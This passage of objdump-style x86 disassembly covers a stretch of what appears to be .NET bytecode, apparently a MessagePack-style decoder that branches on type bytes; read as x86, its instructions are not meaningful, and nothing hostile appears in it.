  403650:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	06                   	push   %es
  403658:	0a 06                	or     (%esi),%al
  40365a:	09 6f 38             	or     %ebp,0x38(%edi)
  40365d:	00 00                	add    %al,(%eax)
  40365f:	06                   	push   %es
  403660:	2b 02                	sub    (%edx),%eax
  403662:	07                   	pop    %es
  403663:	0a 11                	or     (%ecx),%dl
  403665:	05 17 58 13 05       	add    $0x5135817,%eax
  40366a:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  403670:	59                   	pop    %ecx
  403671:	32 cf                	xor    %bh,%cl
  403673:	08 08                	or     %cl,(%eax)
  403675:	8e 69 17             	mov    0x17(%ecx),%gs
  403678:	59                   	pop    %ecx
  403679:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  403680:	00 06                	add    %al,(%esi)
  403682:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403685:	04 15                	add    $0x15,%al
  403687:	31 0e                	xor    %ecx,(%esi)
  403689:	06                   	push   %es
  40368a:	7b 26                	jnp    0x4036b2
  40368c:	00 00                	add    %al,(%eax)
  40368e:	04 11                	add    $0x11,%al
  403690:	04 6f                	add    $0x6f,%al
  403692:	59                   	pop    %ecx
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 2a                	or     (%edx),%ch
  403697:	06                   	push   %es
  403698:	6f                   	outsl  %ds:(%esi),(%dx)
  403699:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40369e:	06                   	push   %es
  40369f:	09 6f 38             	or     %ebp,0x38(%edi)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	06                   	push   %es
  4036a5:	06                   	push   %es
  4036a6:	2a 00                	sub    (%eax),%al
  4036a8:	1b 30                	sbb    (%eax),%esi
  4036aa:	04 00                	add    $0x0,%al
  4036ac:	35 00 00 00 0f       	xor    $0xf000000,%eax
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	11 73 79             	adc    %esi,0x79(%ebx)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	0a 0a                	or     (%edx),%cl
  4036ba:	03 28                	add    (%eax),%ebp
  4036bc:	a0 00 00 06 10       	mov    0x10060000,%al
  4036c1:	01 06                	add    %eax,(%esi)
  4036c3:	03 16                	add    (%esi),%edx
  4036c5:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4036cb:	00 0a                	add    %cl,(%edx)
  4036cd:	06                   	push   %es
  4036ce:	16                   	push   %ss
  4036cf:	6a 6f                	push   $0x6f
  4036d1:	4e                   	dec    %esi
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	0a 02                	or     (%edx),%al
  4036d6:	06                   	push   %es
  4036d7:	28 56 00             	sub    %dl,0x0(%esi)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	de 0a                	fimuls (%edx)
  4036de:	06                   	push   %es
  4036df:	2c 06                	sub    $0x6,%al
  4036e1:	06                   	push   %es
  4036e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e3:	33 00                	xor    (%eax),%eax
  4036e5:	00 0a                	add    %cl,(%edx)
  4036e7:	dc 2a                	fsubrl (%edx)
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	00 01                	add    %al,(%ecx)
  4036ed:	10 00                	adc    %al,(%eax)
  4036ef:	00 02                	add    %al,(%edx)
  4036f1:	00 06                	add    %al,(%esi)
  4036f3:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	02 00                	add    (%eax),%al
  403700:	16                   	push   %ss
  403701:	00 00                	add    %al,(%eax)
  403703:	00 10                	add    %dl,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	11 03                	adc    %eax,(%ebx)
  403709:	19 73 77             	sbb    %esi,0x77(%ebx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	0a 0a                	or     (%edx),%cl
  403710:	02 06                	add    (%esi),%al
  403712:	28 56 00             	sub    %dl,0x0(%esi)
  403715:	00 06                	add    %al,(%esi)
  403717:	06                   	push   %es
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	41                   	inc    %ecx
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 2a                	or     (%edx),%ch
  40371e:	00 00                	add    %al,(%eax)
  403720:	13 30                	adc    (%eax),%esi
  403722:	04 00                	add    $0x0,%al
  403724:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  40372b:	11 03                	adc    %eax,(%ebx)
  40372d:	6f                   	outsl  %ds:(%esi),(%dx)
  40372e:	7a 00                	jp     0x403730
  403730:	00 0a                	add    %cl,(%edx)
  403732:	d2 0a                	rorb   %cl,(%edx)
  403734:	14 0b                	adc    $0xb,%al
  403736:	16                   	push   %ss
  403737:	0c 16                	or     $0x16,%al
  403739:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  40373e:	09 02                	or     %eax,(%edx)
  403740:	06                   	push   %es
  403741:	6e                   	outsb  %ds:(%esi),(%dx)
  403742:	28 42 00             	sub    %al,0x0(%edx)
  403745:	00 06                	add    %al,(%esi)
  403747:	2a 06                	sub    (%esi),%al
  403749:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  40374f:	42                   	inc    %edx
  403750:	06                   	push   %es
  403751:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  403757:	3a 02                	cmp    (%edx),%al
  403759:	28 39                	sub    %bh,(%ecx)
  40375b:	00 00                	add    %al,(%eax)
  40375d:	06                   	push   %es
  40375e:	02 18                	add    (%eax),%bl
  403760:	7d 24                	jge    0x403786
  403762:	00 00                	add    %al,(%eax)
  403764:	04 06                	add    $0x6,%al
  403766:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  40376c:	0c 16                	or     $0x16,%al
  40376e:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403773:	3a 00                	cmp    (%eax),%al
  403775:	00 06                	add    %al,(%esi)
  403777:	25 03 28 64 00       	and    $0x642803,%eax
  40377c:	00 06                	add    %al,(%esi)
  40377e:	6f                   	outsl  %ds:(%esi),(%dx)
  40377f:	38 00                	cmp    %al,(%eax)
  403781:	00 06                	add    %al,(%esi)
  403783:	03 6f 56             	add    0x56(%edi),%ebp
  403786:	00 00                	add    %al,(%eax)
  403788:	06                   	push   %es
  403789:	09 17                	or     %edx,(%edi)
  40378b:	58                   	pop    %eax
  40378c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403791:	2a 06                	sub    (%esi),%al
  403793:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403799:	36 06                	ss push %es
  40379b:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  4037a1:	2e 02 28             	add    %cs:(%eax),%ch
  4037a4:	39 00                	cmp    %eax,(%eax)
  4037a6:	00 06                	add    %al,(%esi)
  4037a8:	02 19                	add    (%ecx),%bl
  4037aa:	7d 24                	jge    0x4037d0
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 06                	add    $0x6,%al
  4037b0:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  4037b6:	0c 16                	or     $0x16,%al
  4037b8:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  4037bd:	3a 00                	cmp    (%eax),%al
  4037bf:	00 06                	add    %al,(%esi)
  4037c1:	03 6f 56             	add    0x56(%edi),%ebp
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	06                   	push   %es
  4037c7:	09 17                	or     %edx,(%edi)
  4037c9:	58                   	pop    %eax
  4037ca:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4037cf:	2a 06                	sub    (%esi),%al
  4037d1:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  4037d7:	1e                   	push   %ds
  4037d8:	06                   	push   %es
  4037d9:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4037df:	16                   	push   %ss
  4037e0:	06                   	push   %es
  4037e1:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4037e7:	0c 02                	or     $0x2,%al
  4037e9:	03 08                	add    (%eax),%ecx
  4037eb:	28 63 00             	sub    %ah,0x0(%ebx)
  4037ee:	00 06                	add    %al,(%esi)
  4037f0:	28 4f 00             	sub    %cl,0x0(%edi)
  4037f3:	00 06                	add    %al,(%esi)
  4037f5:	2a 06                	sub    (%esi),%al
  4037f7:	20 e0                	and    %ah,%al
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 32                	add    %dh,(%edx)
  4037fd:	12 06                	adc    (%esi),%al
  4037ff:	20 ff                	and    %bh,%bh
  403801:	00 00                	add    %al,(%eax)
  403803:	00 30                	add    %dh,(%eax)
  403805:	0a 02                	or     (%edx),%al
  403807:	06                   	push   %es
  403808:	67 6a 28             	addr16 push $0x28
  40380b:	42                   	inc    %edx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	06                   	push   %es
  40380f:	2a 06                	sub    (%esi),%al
  403811:	20 c0                	and    %al,%al
  403813:	00 00                	add    %al,(%eax)
  403815:	00 33                	add    %dh,(%ebx)
  403817:	07                   	pop    %es
  403818:	02 28                	add    (%eax),%ch
  40381a:	4e                   	dec    %esi
  40381b:	00 00                	add    %al,(%eax)
  40381d:	06                   	push   %es
  40381e:	2a 06                	sub    (%esi),%al
  403820:	20 c1                	and    %al,%cl
  403822:	00 00                	add    %al,(%eax)
  403824:	00 33                	add    %dh,(%ebx)
  403826:	0b 72 2b             	or     0x2b(%edx),%esi
  403829:	21 00                	and    %eax,(%eax)
  40382b:	70 73                	jo     0x4038a0
  40382d:	7b 00                	jnp    0x40382f
  40382f:	00 0a                	add    %cl,(%edx)
  403831:	7a 06                	jp     0x403839
  403833:	20 c2                	and    %al,%dl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 33                	add    %dh,(%ebx)
  403839:	08 02                	or     %al,(%edx)
  40383b:	16                   	push   %ss
  40383c:	28 51 00             	sub    %dl,0x0(%ecx)
  40383f:	00 06                	add    %al,(%esi)
  403841:	2a 06                	sub    (%esi),%al
  403843:	20 c3                	and    %al,%bl
  403845:	00 00                	add    %al,(%eax)
  403847:	00 33                	add    %dh,(%ebx)
  403849:	08 02                	or     %al,(%edx)
  40384b:	17                   	pop    %ss
  40384c:	28 51 00             	sub    %dl,0x0(%ecx)
  40384f:	00 06                	add    %al,(%esi)
  403851:	2a 06                	sub    (%esi),%al
  403853:	20 c4                	and    %al,%ah
  403855:	00 00                	add    %al,(%eax)
  403857:	00 33                	add    %dh,(%ebx)
  403859:	20 03                	and    %al,(%ebx)
  40385b:	6f                   	outsl  %ds:(%esi),(%dx)
  40385c:	7a 00                	jp     0x40385e
  40385e:	00 0a                	add    %cl,(%edx)
  403860:	0c 08                	or     $0x8,%al
  403862:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403866:	01 0b                	add    %ecx,(%ebx)
  403868:	03 07                	add    (%edi),%eax
  40386a:	16                   	push   %ss
  40386b:	08 6f 45             	or     %ch,0x45(%edi)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0a 26                	or     (%esi),%ah
  403872:	02 07                	add    (%edi),%al
  403874:	28 47 00             	sub    %al,0x0(%edi)
  403877:	00 06                	add    %al,(%esi)
  403879:	2a 06                	sub    (%esi),%al
  40387b:	20 c5                	and    %al,%ch
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 33                	add    %dh,(%ebx)
  403881:	39 18                	cmp    %ebx,(%eax)
  403883:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403887:	01 0b                	add    %ecx,(%ebx)
  403889:	03 07                	add    (%edi),%eax
  40388b:	16                   	push   %ss
  40388c:	18 6f 45             	sbb    %ch,0x45(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 26                	or     (%esi),%ah
  403893:	07                   	pop    %es
  403894:	28 26                	sub    %ah,(%esi)
  403896:	00 00                	add    %al,(%eax)
  403898:	06                   	push   %es
  403899:	0b 07                	or     (%edi),%eax
  40389b:	16                   	push   %ss
  40389c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4038a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038a7:	01 0b                	add    %ecx,(%ebx)
  4038a9:	03 07                	add    (%edi),%eax
  4038ab:	16                   	push   %ss
  4038ac:	08 6f 45             	or     %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	02 07                	add    (%edi),%al
  4038b5:	28 47 00             	sub    %al,0x0(%edi)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2a 06                	sub    (%esi),%al
  4038bc:	20 c6                	and    %al,%dh
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	00 33                	add    %dh,(%ebx)
  4038c2:	39 1a                	cmp    %ebx,(%edx)
  4038c4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038c8:	01 0b                	add    %ecx,(%ebx)
  4038ca:	03 07                	add    (%edi),%eax
  4038cc:	16                   	push   %ss
  4038cd:	1a 6f 45             	sbb    0x45(%edi),%ch
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 26                	or     (%esi),%ah
  4038d4:	07                   	pop    %es
  4038d5:	28 26                	sub    %ah,(%esi)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	06                   	push   %es
  4038da:	0b 07                	or     (%edi),%eax
  4038dc:	16                   	push   %ss
  4038dd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4038e1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038e4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038e8:	01 0b                	add    %ecx,(%ebx)
  4038ea:	03 07                	add    (%edi),%eax
  4038ec:	16                   	push   %ss
  4038ed:	08 6f 45             	or     %ch,0x45(%edi)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 26                	or     (%esi),%ah
  4038f4:	02 07                	add    (%edi),%al
  4038f6:	28 47 00             	sub    %al,0x0(%edi)
  4038f9:	00 06                	add    %al,(%esi)
  4038fb:	2a 06                	sub    (%esi),%al
  4038fd:	20 c7                	and    %al,%bh
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 2e                	add    %ch,(%esi)
  403903:	10 06                	adc    %al,(%esi)
  403905:	20 c8                	and    %cl,%al
  403907:	00 00                	add    %al,(%eax)
  403909:	00 2e                	add    %ch,(%esi)
  40390b:	08 06                	or     %al,(%esi)
  40390d:	20 c9                	and    %cl,%cl
  40390f:	00 00                	add    %al,(%eax)
  403911:	00 33                	add    %dh,(%ebx)
  403913:	0b 72 57             	or     0x57(%edx),%esi
  403916:	21 00                	and    %eax,(%eax)
  403918:	70 73                	jo     0x40398d
  40391a:	7b 00                	jnp    0x40391c
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	7a 06                	jp     0x403926
  403920:	20 ca                	and    %cl,%dl
  403922:	00 00                	add    %al,(%eax)
  403924:	00 33                	add    %dh,(%ebx)
  403926:	26 1a 8d 44 00 00 01 	sbb    %es:0x1000044(%ebp),%cl
  40392d:	0b 03                	or     (%ebx),%eax
  40392f:	07                   	pop    %es
  403930:	16                   	push   %ss
  403931:	1a 6f 45             	sbb    0x45(%edi),%ch
  403934:	00 00                	add    %al,(%eax)
  403936:	0a 26                	or     (%esi),%ah
  403938:	07                   	pop    %es
  403939:	28 26                	sub    %ah,(%esi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	06                   	push   %es
  40393e:	0b 02                	or     (%edx),%eax
  403940:	07                   	pop    %es
  403941:	16                   	push   %ss
  403942:	28 7d 00             	sub    %bh,0x0(%ebp)
  403945:	00 0a                	add    %cl,(%edx)
  403947:	28 52 00             	sub    %dl,0x0(%edx)
  40394a:	00 06                	add    %al,(%esi)
  40394c:	2a 06                	sub    (%esi),%al
  40394e:	20 cb                	and    %cl,%bl
  403950:	00 00                	add    %al,(%eax)
  403952:	00 33                	add    %dh,(%ebx)
  403954:	26 1e                	es push %ds
  403956:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40395a:	01 0b                	add    %ecx,(%ebx)
  40395c:	03 07                	add    (%edi),%eax
  40395e:	16                   	push   %ss
  40395f:	1e                   	push   %ds
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	45                   	inc    %ebp
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 26                	or     (%esi),%ah
  403966:	07                   	pop    %es
  403967:	28 26                	sub    %ah,(%esi)
  403969:	00 00                	add    %al,(%eax)
  40396b:	06                   	push   %es
  40396c:	0b 02                	or     (%edx),%eax
  40396e:	07                   	pop    %es
  40396f:	16                   	push   %ss
  403970:	28 7e 00             	sub    %bh,0x0(%esi)
  403973:	00 0a                	add    %cl,(%edx)
  403975:	28 53 00             	sub    %dl,0x0(%ebx)
  403978:	00 06                	add    %al,(%esi)
  40397a:	2a 06                	sub    (%esi),%al
  40397c:	20 cc                	and    %cl,%ah
  40397e:	00 00                	add    %al,(%eax)
  403980:	00 33                	add    %dh,(%ebx)
  403982:	11 03                	adc    %eax,(%ebx)
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	7a 00                	jp     0x403987
  403987:	00 0a                	add    %cl,(%edx)
  403989:	d2 0a                	rorb   %cl,(%edx)
  40398b:	02 06                	add    (%esi),%al
  40398d:	6e                   	outsb  %ds:(%esi),(%dx)
  40398e:	28 42 00             	sub    %al,0x0(%edx)
  403991:	00 06                	add    %al,(%esi)
  403993:	2a 06                	sub    (%esi),%al
  403995:	20 cd                	and    %cl,%ch
  403997:	00 00                	add    %al,(%eax)
  403999:	00 33                	add    %dh,(%ebx)
  40399b:	27                   	daa
  40399c:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  4039a2:	0b 03                	or     (%ebx),%eax
  4039a4:	07                   	pop    %es
  4039a5:	16                   	push   %ss
  4039a6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	0a 26                	or     (%esi),%ah
  4039ad:	07                   	pop    %es
  4039ae:	28 26                	sub    %ah,(%esi)
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 02                	or     (%edx),%eax
  4039b5:	07                   	pop    %es
  4039b6:	16                   	push   %ss
  4039b7:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4039bb:	0a 6e 28             	or     0x28(%esi),%ch
  4039be:	42                   	inc    %edx
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	06                   	push   %es
  4039c2:	2a 06                	sub    (%esi),%al
  4039c4:	20 ce                	and    %cl,%dh
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 33                	add    %dh,(%ebx)
  4039ca:	27                   	daa
  4039cb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4039d1:	0b 03                	or     (%ebx),%eax
  4039d3:	07                   	pop    %es
  4039d4:	16                   	push   %ss
  4039d5:	1a 6f 45             	sbb    0x45(%edi),%ch
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	28 26                	sub    %ah,(%esi)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	06                   	push   %es
  4039e2:	0b 02                	or     (%edx),%eax
  4039e4:	07                   	pop    %es
  4039e5:	16                   	push   %ss
  4039e6:	28 7f 00             	sub    %bh,0x0(%edi)
  4039e9:	00 0a                	add    %cl,(%edx)
  4039eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ec:	28 42 00             	sub    %al,0x0(%edx)
  4039ef:	00 06                	add    %al,(%esi)
  4039f1:	2a 06                	sub    (%esi),%al
  4039f3:	20 cf                	and    %cl,%bh
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 33                	add    %dh,(%ebx)
  4039f9:	26 1e                	es push %ds
  4039fb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4039ff:	01 0b                	add    %ecx,(%ebx)
  403a01:	03 07                	add    (%edi),%eax
  403a03:	16                   	push   %ss
  403a04:	1e                   	push   %ds
  403a05:	6f                   	outsl  %ds:(%esi),(%dx)
  403a06:	45                   	inc    %ebp
  403a07:	00 00                	add    %al,(%eax)
  403a09:	0a 26                	or     (%esi),%ah
  403a0b:	07                   	pop    %es
  403a0c:	28 26                	sub    %ah,(%esi)
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	0b 02                	or     (%edx),%eax
  403a13:	07                   	pop    %es
  403a14:	16                   	push   %ss
  403a15:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  403a1b:	43                   	inc    %ebx
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	2a 06                	sub    (%esi),%al
  403a21:	20 dc                	and    %bl,%ah
  403a23:	00 00                	add    %al,(%eax)
  403a25:	00 33                	add    %dh,(%ebx)
  403a27:	46                   	inc    %esi
  403a28:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403a2e:	0b 03                	or     (%ebx),%eax
  403a30:	07                   	pop    %es
  403a31:	16                   	push   %ss
  403a32:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 26                	or     (%esi),%ah
  403a39:	07                   	pop    %es
  403a3a:	28 26                	sub    %ah,(%esi)
  403a3c:	00 00                	add    %al,(%eax)
  403a3e:	06                   	push   %es
  403a3f:	0b 07                	or     (%edi),%eax
  403a41:	16                   	push   %ss
  403a42:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a48:	02 28                	add    (%eax),%ch
  403a4a:	39 00                	cmp    %eax,(%eax)
  403a4c:	00 06                	add    %al,(%esi)
  403a4e:	02 19                	add    (%ecx),%bl
  403a50:	7d 24                	jge    0x403a76
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 16                	add    $0x16,%al
  403a56:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403a5b:	3a 00                	cmp    (%eax),%al
  403a5d:	00 06                	add    %al,(%esi)
  403a5f:	03 6f 56             	add    0x56(%edi),%ebp
  403a62:	00 00                	add    %al,(%eax)
  403a64:	06                   	push   %es
  403a65:	09 17                	or     %edx,(%edi)
  403a67:	58                   	pop    %eax
  403a68:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403a6d:	2a 06                	sub    (%esi),%al
  403a6f:	20 dd                	and    %bl,%ch
  403a71:	00 00                	add    %al,(%eax)
  403a73:	00 33                	add    %dh,(%ebx)
  403a75:	46                   	inc    %esi
  403a76:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403a7c:	0b 03                	or     (%ebx),%eax
  403a7e:	07                   	pop    %es
  403a7f:	16                   	push   %ss
  403a80:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 26                	or     (%esi),%ah
  403a87:	07                   	pop    %es
  403a88:	28 26                	sub    %ah,(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	06                   	push   %es
  403a8d:	0b 07                	or     (%edi),%eax
  403a8f:	16                   	push   %ss
  403a90:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a96:	02 28                	add    (%eax),%ch
  403a98:	39 00                	cmp    %eax,(%eax)
  403a9a:	00 06                	add    %al,(%esi)
  403a9c:	02 19                	add    (%ecx),%bl
  403a9e:	7d 24                	jge    0x403ac4
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	04 16                	add    $0x16,%al
  403aa4:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403aa9:	3a 00                	cmp    (%eax),%al
  403aab:	00 06                	add    %al,(%esi)
  403aad:	03 6f 56             	add    0x56(%edi),%ebp
  403ab0:	00 00                	add    %al,(%eax)
  403ab2:	06                   	push   %es
  403ab3:	09 17                	or     %edx,(%edi)
  403ab5:	58                   	pop    %eax
  403ab6:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403abb:	2a 06                	sub    (%esi),%al
  403abd:	20 d9                	and    %bl,%cl
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	00 33                	add    %dh,(%ebx)
  403ac3:	0e                   	push   %cs
  403ac4:	02 06                	add    (%esi),%al
  403ac6:	03 28                	add    (%eax),%ebp
  403ac8:	65 00 00             	add    %al,%gs:(%eax)
  403acb:	06                   	push   %es
  403acc:	28 4f 00             	sub    %cl,0x0(%edi)
  403acf:	00 06                	add    %al,(%esi)
  403ad1:	2a 06                	sub    (%esi),%al
  403ad3:	20 de                	and    %bl,%dh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 33                	add    %dh,(%ebx)
  403ad9:	52                   	push   %edx
  403ada:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ae0:	0b 03                	or     (%ebx),%eax
  403ae2:	07                   	pop    %es
  403ae3:	16                   	push   %ss
  403ae4:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	0a 26                	or     (%esi),%ah
  403aeb:	07                   	pop    %es
  403aec:	28 26                	sub    %ah,(%esi)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	0b 07                	or     (%edi),%eax
  403af3:	16                   	push   %ss
  403af4:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403afa:	02 28                	add    (%eax),%ch
  403afc:	39 00                	cmp    %eax,(%eax)
  403afe:	00 06                	add    %al,(%esi)
  403b00:	02 18                	add    (%eax),%bl
  403b02:	7d 24                	jge    0x403b28
  403b04:	00 00                	add    %al,(%eax)
  403b06:	04 16                	add    $0x16,%al
  403b08:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b0d:	3a 00                	cmp    (%eax),%al
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	25 03 28 64 00       	and    $0x642803,%eax
  403b16:	00 06                	add    %al,(%esi)
  403b18:	6f                   	outsl  %ds:(%esi),(%dx)
  403b19:	38 00                	cmp    %al,(%eax)
  403b1b:	00 06                	add    %al,(%esi)
  403b1d:	03 6f 56             	add    0x56(%edi),%ebp
  403b20:	00 00                	add    %al,(%eax)
  403b22:	06                   	push   %es
  403b23:	09 17                	or     %edx,(%edi)
  403b25:	58                   	pop    %eax
  403b26:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b2b:	2a 06                	sub    (%esi),%al
  403b2d:	20 de                	and    %bl,%dh
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	00 33                	add    %dh,(%ebx)
  403b33:	52                   	push   %edx
  403b34:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403b3a:	0b 03                	or     (%ebx),%eax
  403b3c:	07                   	pop    %es
  403b3d:	16                   	push   %ss
  403b3e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 26                	or     (%esi),%ah
  403b45:	07                   	pop    %es
  403b46:	28 26                	sub    %ah,(%esi)
  403b48:	00 00                	add    %al,(%eax)
  403b4a:	06                   	push   %es
  403b4b:	0b 07                	or     (%edi),%eax
  403b4d:	16                   	push   %ss
  403b4e:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403b54:	02 28                	add    (%eax),%ch
  403b56:	39 00                	cmp    %eax,(%eax)
  403b58:	00 06                	add    %al,(%esi)
  403b5a:	02 18                	add    (%eax),%bl
  403b5c:	7d 24                	jge    0x403b82
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	04 16                	add    $0x16,%al
  403b62:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b67:	3a 00                	cmp    (%eax),%al
  403b69:	00 06                	add    %al,(%esi)
  403b6b:	25 03 28 64 00       	and    $0x642803,%eax
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	38 00                	cmp    %al,(%eax)
  403b75:	00 06                	add    %al,(%esi)
  403b77:	03 6f 56             	add    0x56(%edi),%ebp
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	06                   	push   %es
  403b7d:	09 17                	or     %edx,(%edi)
  403b7f:	58                   	pop    %eax
  403b80:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b85:	2a 06                	sub    (%esi),%al
  403b87:	20 df                	and    %bl,%bh
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 33                	add    %dh,(%ebx)
  403b8d:	52                   	push   %edx
  403b8e:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403b94:	0b 03                	or     (%ebx),%eax
  403b96:	07                   	pop    %es
  403b97:	16                   	push   %ss
  403b98:	1a 6f 45             	sbb    0x45(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 26                	or     (%esi),%ah
  403b9f:	07                   	pop    %es
  403ba0:	28 26                	sub    %ah,(%esi)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	0b 07                	or     (%edi),%eax
  403ba7:	16                   	push   %ss
  403ba8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403bac:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403baf:	28 39                	sub    %bh,(%ecx)
  403bb1:	00 00                	add    %al,(%eax)
  403bb3:	06                   	push   %es
  403bb4:	02 18                	add    (%eax),%bl
